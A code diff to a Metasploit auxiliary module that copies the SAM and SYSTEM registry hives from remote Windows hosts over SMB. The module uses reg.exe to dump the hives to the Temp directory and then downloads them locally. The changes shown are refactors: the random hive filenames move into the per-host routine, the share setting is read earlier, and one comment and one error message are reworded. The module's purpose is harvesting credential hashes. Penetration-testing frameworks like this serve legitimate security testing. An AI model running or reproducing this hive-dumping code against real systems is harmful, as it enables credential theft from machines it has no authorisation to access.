@@ -58,9 +58,6 @@ class Metasploit3 < Msf::Auxiliary
 		@empty_lm = "aad3b435b51404eeaad3b435b51404ee"
 		@empty_nt = "31d6cfe0d16ae931b73c59d7e0c089c0"
 		
-		@sampath = "#{Rex::Text.rand_text_alpha(20)}"
-		@syspath = "#{Rex::Text.rand_text_alpha(20)}"
-		
 		@parity = [
 			1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
 			16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
@@ -92,8 +89,11 @@ class Metasploit3 < Msf::Auxiliary
 	# This is the main controller function
 	#----------------------------------------
 	def run_host(ip)
+		@sampath = "#{Rex::Text.rand_text_alpha(20)}"
+		@syspath = "#{Rex::Text.rand_text_alpha(20)}"
 		::FileUtils.mkdir_p(@logdir) unless ::File.exists?(@logdir)
 		hives = [@sampath, @syspath]
+		smbshare = datastore['SMBSHARE']
 		
 		#Try and Connect to the target
 		begin
@@ -111,7 +111,6 @@ class Metasploit3 < Msf::Auxiliary
 			return
 		end
 		
-		smbshare = datastore['SMBSHARE']
 		begin
 			simple.connect(smbshare)
 			save_reg_hives(smbshare, ip)
@@ -133,7 +132,7 @@ class Metasploit3 < Msf::Auxiliary
 	
 	
 	#--------------------------------------------------------------------------------------------------------
-	# This method attempts to use reg.exe to generate copies of the SAM, SYSTEM, and SECURITY registry hives
+	# This method attempts to use reg.exe to generate copies of the SAM and SYSTEM, registry hives
 	# and store them in the Windows Temp directory on the remote host
 	#--------------------------------------------------------------------------------------------------------
 	def save_reg_hives(smbshare, ip)
@@ -164,7 +163,7 @@ class Metasploit3 < Msf::Auxiliary
 			remotesam = simple.open("\\WINDOWS\\Temp\\#{hive}", 'rob')		
 			data = remotesam.read
 	
-			#Save it to local file system
+			# Save it to local file system
 			file = File.open("#{@logdir}/#{ip}/#{hive}", "w+")
 			file.write(data)
 
@@ -172,7 +171,7 @@ class Metasploit3 < Msf::Auxiliary
 			remotesam.close
 			simple.disconnect("\\\\#{ip}\\#{smbshare}")
 		rescue StandardError => copyerror
-			print_error("Unable to make copies of the hive files: #{copyerror}")
+			print_error("Unable to download hive copies from #{ip}: #{copyerror}")
 			return copyerror
 		end
 	end
